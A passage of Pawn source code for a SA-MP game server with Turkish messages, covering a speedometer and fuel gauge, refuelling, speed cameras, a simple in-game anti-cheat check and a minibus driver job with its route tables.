			if (strcmp(ParameterName, "[/Transfer]", false) == 0) // If the parametername is correct ("[/Transfer]")
			{
				// Add the money to your bank-account that was transferred by another player
				APlayerData[playerid][PlayerMoney] +=  TransferMoney;
				// Inform the player that a player has transferred some money to your bank account
				format(Msg, 128, "{00BBFF}Oyuncu {FFBB00}%s{00BBFF} hesabýnýza {FFBB00}$%i{00BBFF} transfer etti", TransferName, TransferMoney);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				format(Msg, 128, "{00BBFF}Transfer Zamaný: {FFBB00}%s", TransferTime);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);
			}

            // Read the next line of the file
			fread(BFile, LineFromFile);
		}

        // Close the file
		fclose(BFile);
		fremove(file);

		SendClientMessage(playerid, -1, "{00FF00}Banka hesabýnýzdaki para tamamen size aktarýldý ve banka hesabýnýz kaldýrýldý.");
		return 1;
	}

 	return 0;
}

// ************************************************************************************************************************************************************
// PPC_Speedometer
// ************************************************************************************************************************************************************

// Forward the function needed to update the speedometer (used by a timer)
forward Speedometer_Update(playerid);
forward RefuelVehicle(playerid);

// This function sets up the speedometer for the given player
Speedometer_Setup(playerid)
{
	// Setup the speedometer for the player
	APlayerData[playerid][SpeedometerText] = TextDrawCreate(500.0, 395.0, " ");
	APlayerData[playerid][FuelGauge] = TextDrawCreate(500.0, 410.0, " ");
	// Enable the TextDraw for this player
	TextDrawShowForPlayer(playerid, APlayerData[playerid][SpeedometerText]);
	TextDrawShowForPlayer(playerid, APlayerData[playerid][FuelGauge]);

	// Start the speedometer timer
	APlayerData[playerid][SpeedometerTimer] = SetTimerEx("Speedometer_Update", 500, true, "i", playerid);

	return 1;
}

// This function cleans up the speedometer for the given player
Speedometer_Cleanup(playerid)
{
	// Destroy the speedometer textdraw
	//TextDrawDestroy(APlayerData[playerid][SpeedometerText]);
	//TextDrawDestroy(APlayerData[playerid][FuelGauge]);
	// Kill the speedometer timer
	KillTimer(APlayerData[playerid][SpeedometerTimer]);
	// Set player speed to 0
	APlayerData[playerid][PlayerSpeed] = 0;

	return 1;
}

// This function gets called by a timer which runs every 500ms to display and update the speedometer
public Speedometer_Update(playerid)
{
	// Setup local variables
	new vehicleid, Float:speed_x, Float:speed_y, Float:speed_z, Float:final_speed, speed_string[50], final_speed_int /*, Float:vehiclehealth*/;
	new FuelString[50], FuelStatus[20];
	new Msg[128], Name[24];

	// Get the ID of the player's vehicle
	vehicleid = GetPlayerVehicleID(playerid);

	//******************************************************************************************************************************
	// Anti-hack stuff
	//******************************************************************************************************************************

	AntiHack(playerid);

	//******************************************************************************************************************************
	// End of anti-hack stuff
	//******************************************************************************************************************************

	// Check and toggle spectate-mode when needed (when target player entered or exited his vehicle)
	if (GetPlayerState(playerid) == PLAYER_STATE_SPECTATING)
	{
	    // Get the target player's ID and name
	    new OtherPlayer = APlayerData[playerid][SpectateID];
		GetPlayerName(OtherPlayer, Name, sizeof(Name));

		// Use the same worldid and interiorid as the OtherPlayer
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(OtherPlayer));
		SetPlayerInterior(playerid, GetPlayerInterior(OtherPlayer));

		// Check if the player is spectating a player
		if (APlayerData[playerid][SpectateType] == ADMIN_SPEC_TYPE_PLAYER)
		{
		    // Check if the target player has entered a vehicle
		    if (GetPlayerVehicleSeat(OtherPlayer) != -1)
		    {
				// Change spectate mode to vehicle
				PlayerSpectateVehicle(playerid, GetPlayerVehicleID(OtherPlayer));
				APlayerData[playerid][SpectateID] = OtherPlayer;
				APlayerData[playerid][SpectateVehicle] = GetPlayerVehicleID(OtherPlayer);
				APlayerData[playerid][SpectateType] = ADMIN_SPEC_TYPE_VEHICLE;
				format(Msg, 128, "{00FF00}Player {FFFF00}%s{00FF00} has entered a vehicle, changing spectate mode to match", Name);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);
		    }
		}
		else // The player is spectating a vehicle
		{
		    // Check if the target player has exited a vehicle
		    if (GetPlayerVehicleSeat(OtherPlayer) == -1)
		    {
				// Change spectate mode to player
				PlayerSpectatePlayer(playerid, OtherPlayer);
				SetPlayerInterior(playerid, GetPlayerInterior(OtherPlayer));
				APlayerData[playerid][SpectateID] = OtherPlayer;
				APlayerData[playerid][SpectateType] = ADMIN_SPEC_TYPE_PLAYER;
				format(Msg, 128, "{00FF00}Player {FFFF00}%s{00FF00} has exited a vehicle, changing spectate mode to match", Name);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);
		    }
		}
	}

	// When the player got a wanted level and a police player warned him to stop, a timer is started and a variable is set to "true"
	// Check if this variable has been set
	if (APlayerData[playerid][PoliceWarnedMe] == true)
	{
	    // Check if the player has no wanted level anymore (after finishing a overloaded mission, player got fined, ...)
		if (APlayerData[playerid][PlayerWanted] == 0)
		{
			APlayerData[playerid][PoliceCanJailMe] = false; // Clear the variable
			APlayerData[playerid][PoliceWarnedMe] = false; // Clear the variable
			APlayerData[playerid][Value_PoliceCanJailMe] = 0; // Clear the remaining time for the timer
			KillTimer(APlayerData[playerid][Timer_PoliceCanJailMe]); // Kill the timer
		}
	}
	if (APlayerData[playerid][FBYWarnedMe] == true)
	{
	    // Check if the player has no wanted level anymore (after finishing a overloaded mission, player got fined, ...)
		if (APlayerData[playerid][PlayerWanted] == 0)
		{
			APlayerData[playerid][FBYCanJailMe] = false; // Clear the variable
			APlayerData[playerid][FBYWarnedMe] = false; // Clear the variable
			APlayerData[playerid][Value_FBYCanJailMe] = 0; // Clear the remaining time for the timer
			KillTimer(APlayerData[playerid][Timer_FBYCanJailMe]); // Kill the timer
		}
	}
	// If the player is inside a vehicle
	if(vehicleid != 0)
	{
		// Get the vehicles velocity
		GetVehicleVelocity(vehicleid, speed_x, speed_y, speed_z);
		// Calculate the speed (in kph)
		final_speed = floatsqroot(((speed_x * speed_x) + (speed_y * speed_y)) + (speed_z * speed_z)) * 158.179;
		// Convert the float value to an int value
		final_speed_int = floatround(final_speed, floatround_round);
		// Also save the speed for the player
		APlayerData[playerid][PlayerSpeed] = final_speed_int;
		// Setup the string to display for the player and display it
		if(MagaraAdami[playerid] == 1)
		{
			format(speed_string, 50, TXT_SpeedometerSpeed, final_speed_int);
			TextDrawSetString(APlayerData[playerid][SpeedometerText], speed_string);
		}

		// Add the speed to the stats (this will be the meters driven in total)
		APlayerData[playerid][StatsMetersDriven] = APlayerData[playerid][StatsMetersDriven] + (final_speed / 7.2);

		// Also display the vehicle's health through the player-health bar
		//GetVehicleHealth(vehicleid, vehiclehealth);
		//SetPlayerHealth(playerid, vehiclehealth / 10.0);

		// Check if the speed is above 10kph and the fuel of the vehicle isn't empty yet
		if ((final_speed_int > 10) && (AVehicleData[vehicleid][Fuel] > 0) && (MotorMOD[vehicleid] == 1))
			AVehicleData[vehicleid][Fuel] = AVehicleData[vehicleid][Fuel] - 1; // Decrease the fuel for this vehicle every time the timer is run
		if(MagaraAdami[playerid] == 1)
		{
			// Construct the fuelgauge
			if ((AVehicleData[vehicleid][Fuel] > 0) && (AVehicleData[vehicleid][Fuel] < 100000))
				format(FuelStatus, 20, "~g~%s~r~%s", "I", "IIIIIIIII"); // Fuel is between 0% and 10% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 1)) && (AVehicleData[vehicleid][Fuel] < ((MaxFuel / 10) * 2)))
				format(FuelStatus, 20, "~g~%s~r~%s", "II", "IIIIIIII"); // Fuel is between 10% and 20% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 2)) && (AVehicleData[vehicleid][Fuel] < ((MaxFuel / 10) * 3)))
				format(FuelStatus, 20, "~g~%s~r~%s", "III", "IIIIIII"); // Fuel is between 20% and 30% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 3)) && (AVehicleData[vehicleid][Fuel] < ((MaxFuel / 10) * 4)))
				format(FuelStatus, 20, "~g~%s~r~%s", "IIII", "IIIIII"); // Fuel is between 30% and 40% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 4)) && (AVehicleData[vehicleid][Fuel] < ((MaxFuel / 10) * 5)))
				format(FuelStatus, 20, "~g~%s~r~%s", "IIIII", "IIIII"); // Fuel is between 40% and 50% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 5)) && (AVehicleData[vehicleid][Fuel] < ((MaxFuel / 10) * 6)))
				format(FuelStatus, 20, "~g~%s~r~%s", "IIIIII", "IIII"); // Fuel is between 50% and 60% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 6)) && (AVehicleData[vehicleid][Fuel] < ((MaxFuel / 10) * 7)))
				format(FuelStatus, 20, "~g~%s~r~%s", "IIIIIII", "III"); // Fuel is between 60% and 70% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 7)) && (AVehicleData[vehicleid][Fuel] < ((MaxFuel / 10) * 8)))
				format(FuelStatus, 20, "~g~%s~r~%s", "IIIIIIII", "II"); // Fuel is between 70% and 80% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 8)) && (AVehicleData[vehicleid][Fuel] < ((MaxFuel / 10) * 9)))
				format(FuelStatus, 20, "~g~%s~r~%s", "IIIIIIIII", "I"); // Fuel is between 80% and 90% full

			if ((AVehicleData[vehicleid][Fuel] >= ((MaxFuel / 10) * 9)) && (AVehicleData[vehicleid][Fuel] <= MaxFuel))
				format(FuelStatus, 20, "~g~%s", "IIIIIIIIII"); // Fuel is between 90% and 100% full (all bars are green)

			if (AVehicleData[vehicleid][Fuel] == 0)
				format(FuelStatus, 20, "~r~%s", "IIIIIIIIII"); // Fuel is empty (all bars are red)

			// Format the final fuel-gauge readout
			format(FuelString, 50, TXT_SpeedometerFuel, FuelStatus);
			// Display the fuel-gauge
			TextDrawSetString(APlayerData[playerid][FuelGauge], FuelString);
		}

		// Check if the vehicle is out of fuel
		if (AVehicleData[vehicleid][Fuel] == 0)
		{
			// Stop the engine and turn off the lights
			new engine,lights,alarm,doors,bonnet,boot,objective;
			GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vehicleid, engine, 0, alarm, doors, bonnet, boot, objective);
		}

		// Check if the player is not in any plane or helicopter (those cannot be caught by speedcamera's)
		if (IsVehicleAirVehicle(vehicleid) == 0)
			if (APlayerData[playerid][PlayerClass] != ClassPolice) // Check if the player isn't speeding (cops won't get caught)
                if (APlayerData[playerid][PlayerClass] != ClassFBY)
                if (APlayerData[playerid][PlayerClass] != ClassFire)
				CheckPlayerSpeeding(playerid);
	}
	else
	{
		// If the player is not inside a vehicle, display an empty string (looks like the speedometer is gone)
		if(MagaraAdami[playerid] == 1)
		{
			TextDrawSetString(APlayerData[playerid][SpeedometerText], " ");
			TextDrawSetString(APlayerData[playerid][FuelGauge], " ");
		}
		// Set the speed of the player to 0
		APlayerData[playerid][PlayerSpeed] = 0;
	}
}

// This timer-function is called when a player picks up a refuelpickup
public RefuelVehicle(playerid)
{
	new RefuelMsg[128];
	// Get the vehicle-id of the player's vehicle
	new vID = GetPlayerVehicleID(playerid);
	// Calculate the amount of fuel that needs to be refuelled
	new Amount = MaxFuel - AVehicleData[vID][Fuel];
	// Calculate the price to refuel
	new RefuelPrice = (Amount * RefuelMaxPrice) / MaxFuel;

	// Allow the player to move again
	TogglePlayerControllable(playerid, 1);

	if(Sirket[playerid] != -1 && SirketBenzini[playerid] == 1)
	{
	    if(Sirketler[ Sirket[playerid] ][SirketKasa] < RefuelPrice)
		{
			SendClientMessage(playerid, 0xFF0000FF, "Þirket kasasýnda benzin alacak para yok!");
			SirketBenzini[playerid] = 0;
			return 1;
		}

	    Sirketler[ Sirket[playerid] ][SirketKasa] -= RefuelPrice;
	    Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;
	    SirketKatki[playerid] -= RefuelPrice;

        AVehicleData[vID][Fuel] = MaxFuel;
		SirketBenzini[playerid] = 0;

        format(RefuelMsg, 128, "{F8F8FF}Þirket benzinliðinden benzin aldýnýz ve þirket kasasýndan {00FF00}%d$ {F8F8FF}ödendi.", RefuelPrice);
        SendClientMessage(playerid, -1, RefuelMsg);
        SendClientMessage(playerid, -1, "{F8F8FF}Ayrýca bu deðer þirkete yaptýðýnýz katký deðerinden de düþüldü.");
	    return 1;
	}

	// Check if the player has enough cash
	if (APlayerData[playerid][PlayerMoney] >= RefuelPrice)
	{
		// Refuel the vehicle
		AVehicleData[vID][Fuel] = MaxFuel;
		// Withdraw the money from the player
		RewardPlayer(playerid, -RefuelPrice, 0);
		// Let the player know he refuelled his vehicle
		format(RefuelMsg, 128, TXT_RefuelledVehicle, RefuelPrice);
		SendClientMessage(playerid, 0xFFFFFFFF, RefuelMsg);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_CannotRefuelVehicle);
	return 1;
}



// This function checks if the player is speeding near a speedcamera
CheckPlayerSpeeding(playerid)
{
	// Setup local variables
	new Name[24], Msg[128];

	// Check if the player hasn't been caught speeding recently
	if (APlayerData[playerid][PlayerCaughtSpeeding] == 0)
	{
		// Loop through all speedcameras
		for (new CamID; CamID < MAX_CAMERAS; CamID++)
		{
		    // Check if this camera has been created
		    if (ACameras[CamID][CamSpeed] != 0)
		    {
				// Check if the player is the driver of the vehicle
				if (GetPlayerVehicleSeat(playerid) == 0)
				{
					// Check if the player's speed is greater than the speed allowed by this camera (no need to process a distance-check if not speeding)
					if (APlayerData[playerid][PlayerSpeed]-1 > ACameras[CamID][CamSpeed])
					{

						// Check if the player is near the camera
						if (IsPlayerInRangeOfPoint(playerid, 25.0, ACameras[CamID][CamX], ACameras[CamID][CamY], ACameras[CamID][CamZ]))
						{
					if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
					{
							APlayerData[playerid][PlayerCaughtSpeeding] = 20;
							PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
							FadePlayerScreen(playerid, 0xFFFFFFAA, 10000);
							SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Admin olduðunuz için radar cezasý almadýnýz.");
					}else{
						if(APlayerData[playerid][PlayerSpeedWarn] == 0)
						{
						APlayerData[playerid][PlayerCaughtSpeeding] = 20;
						SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Rarada Yakalandýn ( {FFCC00}Bu bir uyarýdýr )");
						SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Birdahaki sefere aranma seviyeniz artacaktýr.!");
						PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
						FadePlayerScreen(playerid, 0xFFFFFFAA, 10000);
						APlayerData[playerid][PlayerSpeedWarn] = 1;
						}else{
						    // Prevent the player being caught multiple times by the same speed-camera
						    APlayerData[playerid][PlayerCaughtSpeeding] = 20;
						    // Increase the wanted-level of this player by 1 star
						    APlayerData[playerid][PlayerWanted]++;
						    // Let the player know he's been caught speeding
						    new string[255]; format(string,sizeof(string),TXT_PlayerCaughtSpeeding,APlayerData[playerid][PlayerSpeed],ACameras[CamID][CamSpeed]); SendClientMessage(playerid, 0xFFFFFFFF, string);

							PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
							FadePlayerScreen(playerid, 0xFFFFFFAA, 10000);

							// Get the name of the player
							GetPlayerName(playerid, Name, sizeof(Name));
							// Also inform all police players that this player is caught speeding
							format(Msg, 128, "{FFCC00}» {FFFFFF}MERKEZ: {FFCC00}%s{FFFFFF} Radara Yakalandi , Goruldugu Yerde Durdurulsun ", Name);
							Police_SendMessage(Msg);
							format(Msg, 128, "{FFCC00}» {FFFFFF}MERKEZ: {FFCC00}%s{FFFFFF} Radara Yakalandi , Goruldugu Yerde Durdurulsun ", Name);
							FBY_SendMessage(Msg);
							}
						}}
					}
				}
		    }
		}
	}
	else // If the player has been caught before, reduce the value until it's 0 again, then he can be caught again
	    APlayerData[playerid][PlayerCaughtSpeeding]--;
}




AdminVarmi()
{
	new BakimBi;
	foreach(new i:Player)
	{
	    if(APlayerData[i][PlayerLevel] > 0 || Root[i] == 1)
	    {
	        BakimBi = 1;
	        break;
	    }
	}
	return BakimBi;
}

// This function processes anti-hack stuff
stock AntiHack(playerid)
{
	// Setup local variables
	new Float:Armour,Float:Can;

	// Skip checking for hacks used by the player if he was reported by the Anti-Hack system already
	if (APlayerData[playerid][AutoReportTime] > 0)
	{
	    // Reduce the time so the player can be reported again soon if he doesn't stop using hacks
	    APlayerData[playerid][AutoReportTime]--;
		// Exit the function, this skips the hack-checks until the AutoReportTime has reached 0
		// Otherwise the player is reported every half a second until he stops using hacks
	    return 1;
	}



	// Check if a filterscript gave some money (or took it) to the player
	if (GetPVarInt(playerid, "PVarMoney") != 0)
	{
		// Add the money to the players account
		APlayerData[playerid][PlayerMoney] = APlayerData[playerid][PlayerMoney] + GetPVarInt(playerid, "PVarMoney");
		// Clear the PVar
		SetPVarInt(playerid, "PVarMoney", 0);
	}
	if (GetPVarInt(playerid, "PVarScore") != 0)
	{
		// Add the money to the players account
		APlayerData[playerid][PlayerScore] = APlayerData[playerid][PlayerScore] + GetPVarInt(playerid, "PVarScore");
		// Clear the PVar
		SetPVarInt(playerid, "PVarScore", 0);
	}

	// Reset the player's money and set it to the stored value in the player's account (do the same for scorepoints)
	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid, APlayerData[playerid][PlayerMoney]);
	SetPlayerScore(playerid, APlayerData[playerid][PlayerScore]);

	// Limit the cash that the player can have
	if (APlayerData[playerid][PlayerMoney] > 999000000)
	    APlayerData[playerid][PlayerMoney] = 999000000;

	// Limit the cash that the player can have below 0
	if (APlayerData[playerid][PlayerMoney] < -1000000)
	    APlayerData[playerid][PlayerMoney] = -1000000;

	// Port anyone out of the area who is not an admin and inside the area 69
	//Player_PortOutAdminZone(playerid, 106.0, 1805.0, -50.0, 285.0, 1940.0, 40.0, 15.0, 1732.0, 25.0);

	// Weapon hacks are also neutralized here, except for police players (if they are allowed to have weapons)
/*	if ((PoliceGetsWeapons == true) && (APlayerData[playerid][PlayerClass] == ClassPolice))
	{
	    // Do nothing
	}
	else
	ResetPlayerWeapons(playerid); // Remove all weapons from the player
*/
	new Yazi[128];

	// Check if the player got any armour (= health-hack)
	GetPlayerArmour(playerid, Armour);
	GetPlayerHealth(playerid, Can);
	// Send an automated report to the admins so they're informed about it and can take action
	if (Armour > 1.0 && God[playerid] == 0 || Can > 101 && God[playerid] == 0 && PlayerPBing[playerid] == false)
	{
		SendReportToAdmins(playerid, "Can-Hilesi", true);
		if(!AdminVarmi())
		{
		    format(Yazi, 128, "{FF0000}[ANTI HILE] %s {F8F8FF}sunucudan atýldý. {FF0000}[Can Hilesi]", GetName(playerid));
		    SendClientMessageToAll(-1, Yazi);
		    SafeKick(playerid);
		}
	}

	// Check if the speed is higher than 300 (kick player if it is)
	// Send an automated report to the admins so they're informed about it and can take action
	if (APlayerData[playerid][PlayerSpeed] > 300)
	{
		SendReportToAdmins(playerid, "Hiz-Hilesi", true);
		if(!AdminVarmi())
		{
		    format(Yazi, 128, "{FF0000}[ANTI HILE] %s {F8F8FF}sunucudan atýldý. {FF0000}[Hýz Hilesi]", GetName(playerid));
		    SendClientMessageToAll(-1, Yazi);
		    SafeKick(playerid);
		}
	}

	// Check if the player is not allowed to have a jetpack (admins lvl 3 and higher can use /fly, so they will be excluded)
	if (APlayerData[playerid][PlayerLevel] < 1 && Root[playerid] == 0 && Balonda[playerid] == false)
	{
		// Check if the player is using a jetpack
		// Send an automated report to the admins so they're informed about it and can take action
		if (GetPlayerSpecialAction(playerid) == 2)
		{
		    SendReportToAdmins(playerid, "Jetpack-Hilesi", true);
		}
	}

	// Detect airbreak hack
	if (GetPlayerVehicleSeat(playerid) == 0)
	{
		// Check if the player is nearly standing still
		if (APlayerData[playerid][PlayerSpeed] < 10)
		{
			// Check if the player switched interior-id's
			if (GetPlayerInterior(playerid) != APlayerData[playerid][PreviousInt])
			{
				// Check if the new interior is the normal world or any mod-shop
			    switch (GetPlayerInterior(playerid))
				{
					case 0, 1, 2, 3: // Check interiors 0, 1, 2 and 3 (normal world and all mod-shops)
					{
						// Store the player's current location and interior-id for the next iteration
						GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
						APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);
						// Exit the function
						return 1;
					}
				}
			}

		    // Check if the player is still near the same place he was half a second ago
			if (IsPlayerInRangeOfPoint(playerid, 7.5, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]))
			{
			}
			else{
		 		// Send an automated report to the admins so they're informed about it and can take action
		        SendReportToAdmins(playerid, "Airbreak-hack", true);
        		if(!AdminVarmi())
				{
		    		format(Yazi, 128, "{FF0000}[ANTI HILE] %s {F8F8FF}sunucudan atýldý. {FF0000}[Airbreak Hilesi]", GetName(playerid));
		    		SendClientMessageToAll(-1, Yazi);
		    		SafeKick(playerid);
				}
			}
		}
	}
	// Store the player's current location and interior-id for the next iteration
	GetPlayerPos(playerid, APlayerData[playerid][PreviousX], APlayerData[playerid][PreviousY], APlayerData[playerid][PreviousZ]);
	APlayerData[playerid][PreviousInt] = GetPlayerInterior(playerid);

	return 1;
}
// ************************************************************************************************************************************************************
// Dolmuþcu
// ************************************************************************************************************************************************************



// Setup a custom type that holds all data about a Dolmus route
enum TDolmusRoute
{
	HomeDepot, // The ID of the home-depot
	LineNumber, // The number of the Dolmusroute
	Score, // Determines the score the player gets when he reaches the end of the Dolmusroute
	RouteDescription[30], // The description of the Dolmusroute
	Locations[30] // The Location-IDs where the player must load/unload passengers (up to 30 Dolmusstops per route)
}

// Setup an array that holds all Dolmusroute data
new ADolmusRoutes[][TDolmusRoute] =
{
	// HomeDepot, LineNumber, array of DolmusLocations (location "-1" states the end of the route -> start over from the first location)
	{64, 101, 3, "LV", {196,197,198,199,200,201,202,203,205,206,207,208,209,196,-1}},
	{64, 203, 4, "LV", {196,210,211,212,213,214,215,216,217,218,219,220,221,222,223,196,-1}},
	{64, 208, 5, "LV", {196,224,225,226,227,228,229,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,196,-1}},
	{64, 310, 3, "LV", {196,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,196,-1}},

    {64, 155, 4, "SF", {303,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,303,-1}},
	{64, 384, 3, "SF", {303,282,283,284,285,286,287,289,290,291,292,303,-1}},
	{64, 780, 2, "SF", {303,293,294,295,296,297,298,299,300,301,302,303,-1}},
	
	{64, 147, 2, "LS", {304,305,306,307,308,309,310,311,312,313,304,-1}},
	{64, 911, 3, "LS", {304,314,315,316,317,318,319,320,321,322,323,324,325,304,-1}},
	{64, 161, 4, "LS", {304,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,304,-1}},
	{64, 310, 5, "LS", {304,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,304,-1}}



};


// Forward the function to Load or Unload passengers during missions (used by a timer)
forward DolmusDriver_LoadUnload(playerid, PassengersOnDolmusStop);



// This function is called when a Dolmusdriver enters a checkpoint
Dolmus_EnterRaceCheckpoint(playerid)
{
	// Check if the player is inside his vehicle while entering a checkpoint
	if (GetPlayerVehicleID(playerid) == APlayerData[playerid][VehicleID])
	{
		// Setup local variables
		new Description[100],  PassengersOnDolmusStop, Job;

		// Show that the player is loading and unloading passengers
	//	GameTextForPlayer(playerid, "Loading/unloading passengers... Please wait", 5000, 4);

		// Disable the player's actions (he cannot move anymore)
		TogglePlayerControllable(playerid, 0);
        GameTextForPlayer(playerid, "~g~Yolcular bekleniyor...", 1500, 5);
		// Get the JobID
		Job = APlayerData[playerid][JobID];
		
		format(Description, 100, "%s", ADolmusRoutes[Job][RouteDescription]);
		// Determine a random number of passengers on the Dolmusstop (between 10 and 30 passengers can be waiting at the Dolmusstop)
		PassengersOnDolmusStop = random(20) + 10;
		// Limit the number of passengers to 100
	//	if ((APlayerData[playerid][Passengers] + PassengersOnDolmusStop) > 100)
	//	    PassengersOnDolmusStop = 100 - APlayerData[playerid][Passengers];

		// Start a timer (Public function "DolmusDriver_LoadUnload(playerid)" gets called when the timer runs out)
		APlayerData[playerid][LoadingTimer] = SetTimerEx("DolmusDriver_LoadUnload", 1500, false, "di" , playerid, PassengersOnDolmusStop);
	}

	return 1;
}

Dialog_DolmusJobMethod(playerid, response, listitem)
{
	// Setup local variables
	new DolmusLine, Description[50], TotalRouteList[1024];

	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

    // Check if the player already started a job
	if (APlayerData[playerid][JobStarted] == false)
	{
		// Select what to do after the player chose "Choose your own Dolmusroute" or "Auto assigned Dolmusroute"
		switch (listitem)
		{
			case 0: // Let the player choose his own Dolmusroute
			{
			    printf("yaraksong0");
				// Construct the list of Dolmusroutes
				for (new i; i < sizeof(ADolmusRoutes); i++)
				{
					// Get the data about the route
					DolmusLine = ADolmusRoutes[i][LineNumber];
					format(Description, 50," Baslangic: %s", ADolmusRoutes[i][RouteDescription]);
					// Add the Dolmusline to the list
					format(TotalRouteList, 1024, "%s%sHat %i (%s)", TotalRouteList, "\n", DolmusLine, Description);
					printf("%s", TotalRouteList);
				}

				// Let the player choose a Dolmusroute
				printf("yaraksong1");
 				ShowPlayerDialog(playerid, DialogDolmusSelectRoute, DIALOG_STYLE_LIST, "{FFFF00}Dolmuþ Hattýný Seçin:" , TotalRouteList, "Seç", "Ýptal");
                printf("yaraksong2");
			}

			case 1: DolmusDriver_StartJob(playerid, random(sizeof(ADolmusRoutes))); // Start a random job
		}
	}
	else // Send a message to let the player know he already has a job
	    SendClientMessage(playerid, 0xFF0000FF, TXT_DolmusdriverAlreadyDoingJob);

	return 1;
}
Dialog_DolmusSelectRoute(playerid, response, listitem)
{
	if(!response) return 1;
	DolmusDriver_StartJob(playerid, listitem);

	return 1;
}
// After a truckdriver entered a checkpoint, a timer is created. This function is called when the timer runs out
public DolmusDriver_LoadUnload(playerid, PassengersOnDolmusStop)
{
    // Setup local variables
	new  Float:x, Float:y, Float:z,  NextLoc, NextStep, Msg[128];
	new Jobs, PassengersGettingOff, Payment;
	new Float:xn, Float: yn, Float:zn;

	// Also delete any race-checkpoint (at the location of the homedepot)
	DisablePlayerCheckpoint(playerid);
	// Delete the checkpoint where the player just loaded/unloaded passengers
	DisablePlayerRaceCheckpoint(playerid);


	// Select the next location (jobstep)
	APlayerData[playerid][JobStep]++;
	NextStep = APlayerData[playerid][JobStep];
	// Determine a random number of passengers leaving the Dolmus and let them leave (if there are any)
	if (APlayerData[playerid][Passengers] > 0)
		PassengersGettingOff = random(APlayerData[playerid][Passengers]);
	APlayerData[playerid][Passengers] = APlayerData[playerid][Passengers] - PassengersGettingOff;
	// Also let the passengers, that are waiting at the Dolmusstop, get on the Dolmus
	APlayerData[playerid][Passengers] = APlayerData[playerid][Passengers] + PassengersOnDolmusStop;

    Jobs = APlayerData[playerid][JobID];
	// Grab the next locationID
	NextLoc = ADolmusRoutes[Jobs][Locations][NextStep];
	// If the end of the route is reached, restart it from location 0 (also add a racecheckpoint at the Dolmusdepot to end the mission)
	if (NextLoc == -1)
	{
	    // Setup local variables
		new MissionMsg[128], Name[24];

		// Get the player name
		GetPlayerName(playerid, Name, sizeof(Name));
		// Construct the message sent to all players that this player completed a mafia mission
		format(MissionMsg, 128, TXT_PlayerCompletedDolmusLine, Name, ADolmusRoutes[Jobs][LineNumber]);
		SendClientMessageToAll(0xFFFFFFFF, MissionMsg);

        TogglePlayerControllable(playerid, 1);

		// Reward the player with a score for completing a Dolmusroute
		RewardPlayer(playerid, 0, ADolmusRoutes[Jobs][Score]);

		// Increase the stats for completing a Dolmus-route
		APlayerData[playerid][StatsDolmusDriverJobs]++;
		format(MissionMsg, 1024, "Dolmuþ görevini baþarýyla bitirdi");
		SqlLogYaz(playerid, 7, MissionMsg);
		if(APlayerData[playerid][StatsDolmusDriverJobs] >= 10)
		{
			GivePlayerAchievement(playerid, DolmuscuAch, 1); // Baþarým Sistemi
		}
		
		EXP[playerid] = EXP[playerid] + 5;
		
		// Also save the data (in case the server crashes, progress would be lost)
		DolmusDriver_EndJob(playerid);
		Oyuncu_Kaydet(playerid);
	}



	// Grab the coordinates of the next location
	x = ALocations[NextLoc][LocX];
	y = ALocations[NextLoc][LocY];
	z = ALocations[NextLoc][LocZ];
	// Create a new checkpoint where the player should load/unload the passengers
	SetPlayerRaceCheckpoint(playerid, 2, x, y, z, xn, yn, zn, 7);

    // Enable the player again (he can move again)
	TogglePlayerControllable(playerid, 1);

	// Reward the player (every passengers that left the Dolmus pays $9) and let him know about it
	if (PassengersGettingOff != 0)
	{
		// Reward the player (give cash and points)
		Payment = PassengersGettingOff * 10;
		RewardPlayer(playerid, Payment, 0);
		format(Msg, 128, TXT_DolmusDriverReward, Payment);
		GameTextForPlayer(playerid, Msg, 3000, 4);
	}
		// Reward the player (every passengers that left the Dolmus pays $9) and let him know about it
	if (VIP[playerid] != 0)
	{
		// Reward the player (give cash and points)
		Payment = PassengersGettingOff * 30;
		RewardPlayer(playerid, Payment, 0);
		format(Msg, 128, TXT_Dolmusvipbonus, Payment);
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);
	}
	return 1;
}



// This function starts the Dolmusdriver job
DolmusDriver_StartJob(playerid, Job)
{
	new Vehicle = GetPlayerVehicleID(playerid), StartLoc;
	new Float:xn, Float: yn, Float:zn;

    // Setup local variables
 	new Float:x, Float:y, Float:z;

	// Job has started
	APlayerData[playerid][JobStarted] = true;
	// Store VehicleID
	APlayerData[playerid][VehicleID] = Vehicle;
